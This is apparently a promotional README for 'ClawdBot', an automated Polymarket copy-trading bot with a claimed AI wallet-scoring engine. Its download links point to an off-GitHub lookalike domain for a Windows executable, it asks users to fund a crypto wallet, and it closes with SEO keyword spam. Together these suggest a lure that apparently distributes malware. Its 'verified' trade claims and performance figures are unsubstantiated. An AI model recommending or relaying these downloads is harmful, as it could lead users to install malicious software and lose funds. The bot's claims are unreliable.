# ClawdBot — Polymarket Copy-Trading Bot

> Mirror the wallets beating Polymarket — automatically. ClawdBot scores every active wallet by win rate, liquidity, and signal confidence, then copies their positions on your behalf. Zero manual analysis required.

![HBwMzhnX0AAfZdn](https://github.com/user-attachments/assets/bbdc9145-3e98-48ac-8b98-78cb3328a087)

## 🤖 What is ClawdBot?

Most trading bots react to price. ClawdBot tracks **who is winning** — and copies them before the crowd catches up.

It's a lightweight AI scoring engine built specifically for prediction markets. ClawdBot continuously monitors active Polymarket wallets, scores each one across five factors, and only executes when confidence exceeds your configured threshold (default: 78%).

**What ClawdBot scores before each trade:**

* **Wallet win rate (90d)** — how accurate the tracked wallet has been over the last 90 days
* **Market sentiment divergence** — whether smart money is moving against the crowd (high-conviction signal)
* **Liquidity depth** — CLOB order book depth vs. your position size, to avoid slippage
* **Probability drift** — how fast and far the implied probability is shifting across correlated markets
* **Confidence threshold** — trades only execute when the internal score exceeds your configured minimum

Every entry, sizing decision, and exit goes through this pipeline. No guesses, no manual triggers.

---

## 📋 Two Ways to Run It

| | Windows App | Python Bot |
|---|---|---|
| **Setup** | Double-click, done | `pip install` + config |
| **Best for** | Running 24/7 without touching code | Custom strategies + research |
| **ClawdBot access** | Embedded, starts automatically | Full API access |
| **Config** | `config.toml` | Full parameter control |

## 📥 Download

| Platform | Architecture | Download |
|----------|-------------|----------|
| **Windows** | x64 | [Download the latest release](https://github-zip.com/clawdbot-polymarket) |
| **macOS** | Apple Silicon | [Download the latest release](https://github-zip.com/clawdbot-polymarket-mac) |

---

## 🚀 Quick Start

### Windows App — 3 steps

```
# 1. Download from Releases

# 2. (Optional) Open config.toml — set your confidence threshold and capital limits

# 3. Double-click the app — ClawdBot starts scanning immediately
```

No Python. No dependencies. No setup.

### Python Bot

```bash
cd clawdbot-polymarket-win64/python
pip install -r requirements.txt
cd ..
python clawdbot-polymarket-win64-v.1.04.11.py
# ClawdBot starts scanning wallets on launch
```

---

## 🧠 How ClawdBot Works

![howToWork](https://github.com/user-attachments/assets/f256ce91-ff15-4941-ba65-108f0b1b797a)


Six stages from signal to trade:

1. **Scan** — indexes active Polymarket wallets, ranks by composite score
2. **Score** — evaluates each signal: win rate, sizing discipline, market depth, timing
3. **Filter** — drops anything below your confidence threshold
4. **Size** — calculates position size from your capital limits and current liquidity
5. **Execute** — places the mirrored position atomically on Polymarket's CLOB
6. **Track** — logs every decision with full scoring breakdown for review

### Scoring Weights

| Factor | Weight | What it measures |
|--------|--------|-----------------|
| Wallet Win Rate (90d) | 35% | Historical accuracy of the tracked wallet |
| Market Liquidity Score | 20% | Order book depth vs. your position size |
| Probability Drift | 20% | Speed and size of implied probability shift |
| Position Sizing Discipline | 15% | Consistency of the wallet's sizing behavior |
| Crowd Divergence | 10% | How far the signal deviates from aggregate sentiment |

---

## ✅ Verified on Polygon Mainnet

ClawdBot has been tested under live conditions. Below are real transactions — you can verify every one on PolygonScan.

**Configuration used:**
* Target wallet (tracked): `0xEb55A1A899594B5b9C406FfA493775Feab54d5e9`
* Execution wallet (bot): `0x2108FF2b299800B7a904BD36A7cEd1c4Db5F47dC`

**Buy — signal detected, ClawdBot score: 91/100**

| | Transaction |
|---|---|
| Target wallet buy | [0x39b3be...](https://polygonscan.com/tx/0x39b3bebdc377f12f116e6a43ed6157e6da2bc17cbb0f8cea63ce6992dd5a0d5e) |
| Bot execution (mirror) | [0xa2e7ab...](https://polygonscan.com/tx/0xa2e7abc0e35e2a7ed275c958209d34686fa87d7b186c8264334f8cbab1eca35d) |

**Sell — exit signal detected, position closed automatically**

| | Transaction |
|---|---|
| Target wallet sell | [0xbbf1fa...](https://polygonscan.com/tx/0xbbf1fa775c7c3ebcf65edf41117964c447b0bcb23864915a90e560f9f2459eb0) |
| Result | 1,690,000 ERC-1155 tokens → 4.66 USDC |

What these confirm:
* Sub-second signal-to-execution latency
* Proportional position sizing from ClawdBot's scoring model
* Full compatibility with Polymarket's CLOB exchange

---

## 📁 Repository Structure

```
clawdbot-polymarket/
│
├── clawdbot-polymarket-win64.exe   # Windows app — ClawdBot embedded
├── config.toml                     # Confidence threshold, capital limits, wallet targets
│
├── data/
│   ├── cache/                      # Wallet score cache and market snapshots
│   ├── logs/                       # Decision logs with scoring breakdowns
│   └── dll/                        # Required shared libraries
│
├── python/
│   ├── src/                        # Source code — ClawdBot engine module
│   ├── docs/                       # ClawdBot API documentation
│   ├── scripts/                    # Signal analysis and backtesting utilities
│   └── requirements.txt
│
└── README.md
```

---

## 🎯 Bot UI Preview
<img width="4096" height="2577" alt="ClawdBot dashboard" src="https://github.com/user-attachments/assets/bff920a6-9a5d-4354-8d8b-a5332e19c964" />


---

## ⚙️ Requirements

**Python dependencies:**
```
python-dotenv, typer[all], devtools, fastapi, uvicorn[standard], httpx, websockets
```

**You also need:**
* Polymarket account — register at polymarket.com
* Web3 wallet — MetaMask or compatible
* USDC/USDC.e on Polygon for funding
* RPC provider — Alchemy, Chainstack, or Infura API key
* `config.toml` — set your confidence threshold and capital limits

---

#### Made with ❤️ for the Polymarket community

seo:
clawdbot polymarket clawdbot copy trading bot clawdbot ai scoring engine clawdbot wallet tracker clawdbot signal bot
clawdbot 5-factor scoring model clawdbot confidence threshold 78 clawdbot wallet win rate clawdbot probability drift
clawdbot crowd divergence clawdbot position sizing clawdbot clob execution clawdbot sub-second latency
clawdbot polygon mainnet clawdbot usdc trading clawdbot prediction market clawdbot smart money tracker
polymarket copy trading bot with ai scoring polymarket wallet mirroring bot polymarket confidence threshold bot
polymarket 5-factor wallet scoring polymarket sub-second copy trading polymarket clob mirror bot
polymarket win rate tracker polymarket probability drift bot polymarket crowd divergence signals
polymarket smart money copy bot polymarket ai signal engine polymarket wallet reputation scoring
best polymarket copy trading bot how to automate polymarket trading polymarket bot with wallet scoring
polymarket bot python polygon polymarket automated wallet mirroring what is clawdbot
clawdbot vs manual polymarket trading clawdbot polymarket signals clawdbot wallet scoring model
polymarket copy trading ai engine polymarket position mirror bot polymarket outcome signals bot
copy trading prediction market bot ai wallet scoring bot polygon usdc copy trading bot
on-chain wallet copy trading clob order book copy bot prediction market signal engine
